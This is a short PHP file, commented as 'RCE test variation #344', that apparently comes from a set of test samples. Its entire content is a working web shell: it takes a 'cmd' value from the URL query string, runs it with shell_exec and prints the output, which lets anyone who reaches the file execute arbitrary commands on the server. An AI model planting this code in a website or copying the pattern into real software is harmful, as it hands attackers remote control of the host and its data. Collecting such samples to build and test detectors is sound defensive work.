<?php
// RCE test variation #344
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>